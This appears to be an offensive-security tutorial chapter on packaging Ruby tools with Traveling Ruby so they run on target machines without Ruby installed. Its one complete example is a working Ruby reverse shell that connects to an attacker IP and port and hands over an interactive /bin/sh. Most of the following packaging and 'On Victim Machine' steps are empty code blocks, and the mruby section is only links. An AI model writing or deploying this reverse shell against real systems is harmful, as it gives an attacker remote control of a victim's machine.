# Module 0x2 | System KungFu

## Packaging

Many questions about building a standalone application that doesn't require Ruby to be pre-installed on the system. Of-course, due attacking machine you cant grantee that ruby is installed on the target system. So here we will demonstrate some ways to do that.


### Traveling-ruby
From official site "*Traveling Ruby is a project which supplies self-contained, "portable" Ruby binaries: Ruby binaries that can run on any Linux distribution and any OS X machine. It also has Windows support (with some caveats). This allows Ruby app developers to bundle these binaries with their Ruby app, so that they can distribute a single package to end users, without needing end users to first install Ruby or gems.*"



#### Preparation 
```
mkdir rshell
cd rshell
```
Create your application -in our case, reverse shell- 
**rshell.rb**
```ruby
#!/usr/bin/env ruby
require 'socket'
if ARGV.size < 2
  puts "ruby #{__FILE__}.rb [HACKER_IP  HACKER_PORT]\n\n"
  exit 0 
end
ip, port = ARGV
s = TCPSocket.open(ip,port).to_i
exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)
```


##### Creating package directories
```
```

##### Quick sanity testing
```
```


##### Creating a wrapper script
```
```

##### Finalizing packages
```
```


##### Automating the process
```ruby
```


##### On Victim Machine
```
```


#### mruby
https://www.youtube.com/watch?v=OvuZ8R4Y9xA

https://github.com/hone/mruby-cli

https://github.com/hone/mruby-cli/releases

https://docs.docker.com/installation/

https://docs.docker.com/compose/install/
